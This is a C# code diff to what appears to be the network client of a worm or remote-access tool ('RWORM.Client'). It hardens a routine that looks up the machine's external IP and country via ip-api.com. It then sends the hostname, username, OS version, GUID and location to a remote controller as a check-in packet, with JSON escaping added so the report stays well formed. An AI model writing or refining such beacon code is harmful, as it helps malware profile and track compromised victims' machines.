@@ -1072,7 +1072,7 @@ namespace RWORM.Client.Network
 
             {
 
-                using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(4) };
+                using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromMilliseconds(1500) };
 
                 var res = await http.GetStringAsync("http://ip-api.com/json/?fields=status,query,countryCode");
 
@@ -1099,23 +1099,37 @@ namespace RWORM.Client.Network
             return ("", "");
 
         }
-
-
+        private static string EscapeJson(string? s)
+        {
+            if (string.IsNullOrEmpty(s)) return "";
+            var sb = new StringBuilder();
+            foreach (char c in s)
+            {
+                switch (c)
+                {
+                    case '\\': sb.Append(@"\\"); break;
+                    case '"':  sb.Append(@"\" + "\""); break;
+                    case '\r': sb.Append(@"\r"); break;
+                    case '\n': sb.Append(@"\n"); break;
+                    case '\t': sb.Append(@"\t"); break;
+                    default:   sb.Append(c); break;
+                }
+            }
+            return sb.ToString();
+        }
 
         private async Task SendSystemInfo()
-
         {
-
             var (extIp, extCc) = await FetchExternalIpInfoAsync();
+            var guid = EscapeJson(Config.GetGuid());
+            var host = EscapeJson(Config.GetHostname());
+            var user = EscapeJson(Config.GetUsername());
+            var os   = EscapeJson(Config.GetOSVersion());
+            var ip   = EscapeJson(extIp);
+            var cc   = EscapeJson(extCc);
 
-            var json = $"{{\"guid\":\"{Config.GetGuid()}\",\"hostname\":\"{Config.GetHostname()}\","
-
-                     + $"\"username\":\"{Config.GetUsername()}\",\"os_version\":\"{Config.GetOSVersion()}\","
-
-                     + $"\"ip_address\":\"{extIp}\",\"country_code\":\"{extCc}\"}}";
-
+            var json = $"{{\"guid\":\"{guid}\",\"hostname\":\"{host}\",\"username\":\"{user}\",\"os_version\":\"{os}\",\"ip_address\":\"{ip}\",\"country_code\":\"{cc}\"}}";
             await SendAsync(CreatePacket(0x02, 0, json));
-
         }
 
 
